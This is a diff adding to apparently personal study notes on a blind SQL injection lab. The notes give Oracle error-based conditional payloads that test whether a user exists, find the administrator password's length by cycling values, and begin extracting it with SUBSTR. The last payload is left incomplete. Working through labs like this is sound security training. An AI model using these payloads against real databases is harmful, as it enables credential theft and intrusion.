@@ -73,4 +73,7 @@ Is there a simpler method to find users? This is good lessons but COME ON MAN!
 '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator1')||' When user does not exist no error, When where doesn't evalaute is kind of like case 1=2, 
 Simples thought is two negatives make a positive. 
 
-
+Next we need to crack the password:
+'||(SELECT CASE WHEN LENGTH(password)=§a§ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'; Cycle 1-30 When response error that is the length. From 505 at 20 we know 20. 
+'||(SELECT CASE WHEN SUBSTR(password,1,1) THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+SUBSTR is the function from Oracle; SUBSTRING is the function from MySql
